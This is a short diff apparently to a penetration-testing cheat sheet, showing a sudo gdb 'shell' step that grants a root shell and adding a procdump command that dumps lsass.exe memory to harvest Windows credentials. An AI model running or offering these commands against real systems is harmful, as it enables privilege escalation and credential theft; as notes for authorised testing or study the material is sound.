@@ -30,3 +30,7 @@ User <user> may run the following commands on <host>:
 sudo gdb
 shell
 #grants shell access through debugger
+
+--# WINDOWS PROCDUMP #--
+#can use procdump to dump lsass memory
+procdump64.exe -accepteula -ma lsass.exe lsass.dmp
